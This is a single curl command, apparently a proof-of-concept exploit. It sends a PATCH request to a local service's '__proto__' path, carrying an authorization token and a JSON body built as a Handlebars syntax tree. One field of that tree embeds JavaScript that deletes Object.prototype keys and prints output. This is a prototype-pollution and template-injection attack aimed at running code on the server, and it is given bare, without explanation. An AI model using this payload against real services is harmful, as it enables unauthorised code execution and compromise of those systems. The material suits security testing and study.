curl -X PATCH http://localhost:8000/jackfromeast/__proto__ \
     -H 'authorization: token 9bf849c1-43a8-45ad-b421-47b88888a0b2' \
     -H 'content-type: application/json' \
     -d '{"body": [{"type": "MustacheStatement","path": 0,"params": [{"type": "NumberLiteral","value": "for (var a in {}) { delete Object.prototype[a]; }; console.log(111)"}],"loc": {"start": 0,"end":0}}], "type": "Program"}'
